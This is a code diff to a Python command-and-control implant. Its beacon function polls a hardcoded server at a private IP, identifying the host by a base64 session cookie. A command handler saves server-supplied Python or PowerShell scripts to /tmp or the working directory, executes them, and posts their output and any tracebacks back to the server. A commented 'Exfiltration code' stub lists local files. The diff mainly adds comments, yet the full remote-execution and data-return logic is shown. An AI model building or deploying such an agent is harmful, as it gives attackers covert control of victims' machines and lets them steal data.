@@ -25,6 +25,7 @@ def staging(identifier):
 def beacon(identifier):
 	start_time = time.time()
 	url = 'http://192.168.19.136:8080'
+
 	while True:
 
 		cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
@@ -37,19 +38,21 @@ def beacon(identifier):
 
 		time.sleep(5)
 
+## Handles commands sent by server as reponse
 def handle_commands(response, identifier):
 	try:
 		## Recieved the commands in a dictionary text {'cmd': 'screenshot', 'script': 'script text'}. Converting to dictionary
 		res = json.loads(response.text)
 
-
 		language = res['language']
+
 		## Save the script to file
 		if platform.system() == 'Linux':
 			dump_dir = '/tmp'
 		else:
 			dump_dir = os.getcwd()
 
+		## Script save to file as per language
 		if language == 'python':
 			save_path = join(dump_dir,res['cmd']+".py")
 		else:
@@ -59,7 +62,8 @@ def handle_commands(response, identifier):
 		f = open(save_path, "w+")
 		f.write(res['script'])
 		f.close()
-		
+
+		## Execute teh script file
 		if os.path.isfile(save_path):
 
 			if language == 'python':
@@ -72,26 +76,26 @@ def handle_commands(response, identifier):
 				result = subprocess.run([r"powershell.exe", save_path], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, shell=True)
 				command_output = result.stdout.decode('utf-8')
 
+
+		## TODO - Add command successful or not?
+		## Send the command output back to server
 		if command_output:
-			# Sending out data
 			url = 'http://192.168.19.136:8080/'+res['cmd']+'/output/'+res['task_id']
 			cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
-			# custom_headers = {'filename':f}
 
 			r = requests.post(url = url,cookies = cookies, data = command_output)
 		else:
-			## Some error happened while exexuting task, send some othe response code?
+			## Some error happened while exexuting task, send some othe response code? TODO
 			pass
 	except:
+		## Some error happened while handling commands, sent the traceback to server back
 		url = 'http://192.168.19.136:8080/'
 		cookies = {'session': base64.b64encode(identifier.encode("ascii")).decode("ascii")}
-		# custom_headers = {'filename':f}
-
 		r = requests.post(url = url,cookies = cookies, data = traceback.format_exc())
 
 
 		
-
+	## Exfiltration code
 	# for f in os.listdir('.'):
 	# 	if isfile(join('.', f)):
 	# 		print(f)
